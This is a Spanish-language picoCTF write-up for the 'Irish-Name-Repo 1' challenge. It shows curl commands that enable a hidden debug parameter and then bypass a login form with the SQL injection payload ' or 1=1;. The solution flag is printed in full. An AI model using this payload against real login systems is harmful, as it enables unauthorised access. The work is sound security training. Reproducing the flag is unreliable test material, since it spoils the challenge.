# Irish-Name-Repo 1

## Objetivo

There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!

## Hints

*  There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
* Try to think about how the website verifies your login.

## Solución

### Solución 1
```
jessy_vl-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/50009/login.html
<!doctype html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
</head>
<body>
<div class="container">
    <div class="row">
        <div class="col-md-12">
            <div class="panel panel-primary" style="margin-top:50px">
                <div class="panel-heading">
                    <h3 class="panel-title">Log In</h3>
                </div>
                <div class="panel-body">
                    <form action="login.php" method="POST">
                        <fieldset>
                            <div class="form-group">
                                <label for="username">Username:</label>
                                <input type="text" id="username" name="username" class="form-control">
                            </div>
                            <div class="form-group">
                                <label for="password">Password:</label>
                                <div class="controls">
                                    <input type="password" id="password" name="password" class="form-control">
                                </div>
                            </div>
                            <input type="hidden" name="debug" value="0">

                            <div class="form-actions">
                                <input type="submit" value="Login" class="btn btn-primary">
                            </div>
                        </fieldset>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
</body>

jessy_vl-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username=admin&password=1&debug=1"
<pre>username: admin
password: 1
SQL query: SELECT * FROM users WHERE name='admin' AND password='1'
</pre><h1>Login failed.</h1>jessy_vl-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username=admin&password=' or 1=1;&debug=1"
<pre>username: admin
password: ' or 1=1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1=1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}</p>jessy_vl-picoctf@webshell:~$ 

```

```
# Logged in!

Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}

```

## Flag

picoCTF{s0m3_SQL_fb3fe2ad}

## Notas adicionales

| Archivo | Descripción |
|------------|-------------|
| 'or 1=1' | Es siempre verdadera    |
| -d | Sirve para hacer un post    |
| & | Sirve para unir los campos   |

Cuando el formulario se procesa es envido a *login.php* 

## Referencias

[SQL INJECTION](https://www.w3schools.com/sql/sql_injection.asp)

